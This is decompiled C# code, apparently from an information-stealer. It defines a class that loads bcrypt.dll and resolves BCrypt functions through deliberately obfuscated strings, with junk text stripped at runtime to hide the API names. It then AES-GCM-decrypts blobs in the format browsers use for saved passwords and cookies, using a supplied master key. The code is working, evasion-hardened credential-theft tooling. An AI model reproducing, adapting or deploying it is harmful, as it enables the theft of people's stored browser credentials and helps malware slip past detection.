using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

// Token: 0x02000009 RID: 9
public class EntityReader
{
	// Token: 0x06000026 RID: 38 RVA: 0x00002CA7 File Offset: 0x00000EA7
	public EntityReader()
	{
		this.LibPtr = MemoryImport.LoadLibrary(Path.Combine(Environment.SystemDirectory, "bcrFileStream.IOypt.dFileStream.IOll".Replace("FileStream.IO", string.Empty)));
	}

	// Token: 0x17000001 RID: 1
	// (get) Token: 0x06000027 RID: 39 RVA: 0x00002CD8 File Offset: 0x00000ED8
	private IntPtr LibPtr { get; }

	// Token: 0x06000028 RID: 40 RVA: 0x00002CE0 File Offset: 0x00000EE0
	public uint D_1(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags)
	{
		return MemoryImport.Func<EntityReader.D1>(MemoryImport.GetProcAddress(this.LibPtr, "BCrstring.EmptyyptOpestring.EmptynAlgorithmProvistring.Emptyder".Replace("string.Empty", string.Empty)))(out phAlgorithm, pszAlgId, pszImplementation, dwFlags);
	}

	// Token: 0x06000029 RID: 41 RVA: 0x00002D10 File Offset: 0x00000F10
	public uint D_2(IntPtr hAlgorithm, uint flags)
	{
		return MemoryImport.Func<EntityReader.D2>(MemoryImport.GetProcAddress(this.LibPtr, "BCruintyptCloseAlgorituinthmProvuintider".Replace("uint", string.Empty)))(hAlgorithm, flags);
	}

	// Token: 0x0600002A RID: 42 RVA: 0x0000520C File Offset: 0x0000340C
	public uint D_3(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, ref int pcbResult, int dwFlags)
	{
		return MemoryImport.Func<EntityReader.D7>(MemoryImport.GetProcAddress(this.LibPtr, "BCrUnmanagedTypeyptDecrUnmanagedTypeypt".Replace("UnmanagedType", string.Empty)))(hKey, pbInput, cbInput, ref pPaddingInfo, pbIV, cbIV, pbOutput, cbOutput, ref pcbResult, dwFlags);
	}

	// Token: 0x0600002B RID: 43 RVA: 0x00002D3D File Offset: 0x00000F3D
	public uint D_4(IntPtr hKey)
	{
		return MemoryImport.Func<EntityReader.D6>(MemoryImport.GetProcAddress(this.LibPtr, "BCrbyte[]yptDesbyte[]troyKbyte[]ey".Replace("byte[]", string.Empty)))(hKey);
	}

	// Token: 0x0600002C RID: 44 RVA: 0x00002D69 File Offset: 0x00000F69
	public uint D_5(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags)
	{
		return MemoryImport.Func<EntityReader.D3>(MemoryImport.GetProcAddress(this.LibPtr, "BCpszPropertyryptGepszPropertytPropepszPropertyrty".Replace("pszProperty", string.Empty)))(hObject, pszProperty, pbOutput, cbOutput, ref pcbResult, flags);
	}

	// Token: 0x0600002D RID: 45 RVA: 0x00002D9D File Offset: 0x00000F9D
	public uint D_6(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags)
	{
		return MemoryImport.Func<EntityReader.D4>(MemoryImport.GetProcAddress(this.LibPtr, "BCEncodingryptSEncodingetPrEncodingoperEncodingty".Replace("Encoding", string.Empty)))(hObject, pszProperty, pbInput, cbInput, dwFlags);
	}

	// Token: 0x0600002E RID: 46 RVA: 0x00005254 File Offset: 0x00003454
	public uint D_7(IntPtr hAlgorithm, IntPtr hImportKey, [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbInput, int cbInput, uint dwFlags)
	{
		return MemoryImport.Func<EntityReader.D5>(MemoryImport.GetProcAddress(this.LibPtr, "BCrbMasterKeyyptImbMasterKeyportKbMasterKeyey".Replace("bMasterKey", string.Empty)))(hAlgorithm, hImportKey, pszBlobType, out phKey, pbKeyObject, cbKeyObject, pbInput, cbInput, dwFlags);
	}

	// Token: 0x06000030 RID: 48 RVA: 0x000052E8 File Offset: 0x000034E8
	private static byte[] Decrypt(byte[] bEncryptedData, byte[] bMasterKey)
	{
		byte[] array = new byte[]
		{
			1,
			2,
			3,
			4,
			5,
			6,
			7,
			8,
			0,
			0,
			0,
			0
		};
		Array.Copy(bEncryptedData, 3, array, 0, 12);
		try
		{
			byte[] array2 = new byte[bEncryptedData.Length - 15];
			Array.Copy(bEncryptedData, 15, array2, 0, bEncryptedData.Length - 15);
			byte[] array3 = new byte[16];
			byte[] array4 = new byte[array2.Length - array3.Length];
			Array.Copy(array2, array2.Length - 16, array3, 0, 16);
			Array.Copy(array2, 0, array4, 0, array2.Length - array3.Length);
			return new EntityReader().Get(bMasterKey, array, null, array4, array3);
		}
		catch (Exception)
		{
		}
		return null;
	}

	// Token: 0x06000031 RID: 49 RVA: 0x00005390 File Offset: 0x00003590
	private byte[] Get(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
	{
		IntPtr intPtr = this.OpenAlgorithmProvider("AES", "Microsoft Primitive Provider", "ChainingModeGCM");
		IntPtr hKey;
		IntPtr hglobal = this.ImportKey(intPtr, key, out hKey);
		BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO bcrypt_AUTHENTICATED_CIPHER_MODE_INFO = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag);
		byte[] array2;
		using (bcrypt_AUTHENTICATED_CIPHER_MODE_INFO)
		{
			byte[] array = new byte[this.MaxAuthTagSize(intPtr)];
			int num = 0;
			if (this.D_3(hKey, cipherText, cipherText.Length, ref bcrypt_AUTHENTICATED_CIPHER_MODE_INFO, array, array.Length, null, 0, ref num, 0) != 0U)
			{
				throw new CryptographicException();
			}
			array2 = new byte[num];
			uint num2 = this.D_3(hKey, cipherText, cipherText.Length, ref bcrypt_AUTHENTICATED_CIPHER_MODE_INFO, array, array.Length, array2, array2.Length, ref num, 0);
			if (num2 == 3221266434U)
			{
				throw new CryptographicException();
			}
			if (num2 != 0U)
			{
				throw new CryptographicException();
			}
		}
		this.D_4(hKey);
		Marshal.FreeHGlobal(hglobal);
		this.D_2(intPtr, 0U);
		return array2;
	}

	// Token: 0x06000032 RID: 50 RVA: 0x00005474 File Offset: 0x00003674
	private int MaxAuthTagSize(IntPtr hAlg)
	{
		byte[] property = this.GetProperty(hAlg, "AuthTagLength");
		return BitConverter.ToInt32(new byte[]
		{
			property[4],
			property[5],
			property[6],
			property[7]
		}, 0);
	}

	// Token: 0x06000033 RID: 51 RVA: 0x000054B4 File Offset: 0x000036B4
	private IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
	{
		IntPtr zero = IntPtr.Zero;
		if (this.D_1(out zero, alg, provider, 0U) != 0U)
		{
			throw new CryptographicException();
		}
		byte[] bytes = Encoding.Unicode.GetBytes(chainingMode);
		if (this.D_6(zero, "ChainingMode", bytes, bytes.Length, 0) != 0U)
		{
			throw new CryptographicException();
		}
		return zero;
	}

	// Token: 0x06000034 RID: 52 RVA: 0x00005500 File Offset: 0x00003700
	private IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
	{
		int num = BitConverter.ToInt32(this.GetProperty(hAlg, "ObjectLength"), 0);
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		byte[] array = this.Concat(new byte[][]
		{
			BitConverter.GetBytes(1296188491),
			BitConverter.GetBytes(1),
			BitConverter.GetBytes(key.Length),
			key
		});
		if (this.D_7(hAlg, IntPtr.Zero, "KeyDataBlob", out hKey, intPtr, num, array, array.Length, 0U) != 0U)
		{
			throw new CryptographicException();
		}
		return intPtr;
	}

	// Token: 0x06000035 RID: 53 RVA: 0x0000557C File Offset: 0x0000377C
	private byte[] GetProperty(IntPtr hAlg, string name)
	{
		int num = 0;
		if (this.D_5(hAlg, name, null, 0, ref num, 0U) != 0U)
		{
			throw new CryptographicException();
		}
		byte[] array = new byte[num];
		if (this.D_5(hAlg, name, array, array.Length, ref num, 0U) != 0U)
		{
			throw new CryptographicException();
		}
		return array;
	}

	// Token: 0x06000036 RID: 54 RVA: 0x000055C0 File Offset: 0x000037C0
	public byte[] Concat(params byte[][] arrays)
	{
		int num = 0;
		foreach (byte[] array in arrays)
		{
			if (array != null)
			{
				num += array.Length;
			}
		}
		byte[] array2 = new byte[num - 1 + 1];
		int num2 = 0;
		foreach (byte[] array3 in arrays)
		{
			if (array3 != null)
			{
				Buffer.BlockCopy(array3, 0, array2, num2, array3.Length);
				num2 += array3.Length;
			}
		}
		return array2;
	}

	// Token: 0x0200000A RID: 10
	// (Invoke) Token: 0x06000038 RID: 56
	private delegate uint D1(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags);

	// Token: 0x0200000B RID: 11
	// (Invoke) Token: 0x0600003C RID: 60
	private delegate uint D2(IntPtr hAlgorithm, uint flags);

	// Token: 0x0200000C RID: 12
	// (Invoke) Token: 0x06000040 RID: 64
	private delegate uint D3(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags);

	// Token: 0x0200000D RID: 13
	// (Invoke) Token: 0x06000044 RID: 68
	private delegate uint D4(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);

	// Token: 0x0200000E RID: 14
	// (Invoke) Token: 0x06000048 RID: 72
	private delegate uint D5(IntPtr hAlgorithm, IntPtr hImportKey, [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbInput, int cbInput, uint dwFlags);

	// Token: 0x0200000F RID: 15
	// (Invoke) Token: 0x0600004C RID: 76
	private delegate uint D6(IntPtr hKey);

	// Token: 0x02000010 RID: 16
	// (Invoke) Token: 0x06000050 RID: 80
	private delegate uint D7(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, ref int pcbResult, int dwFlags);
}
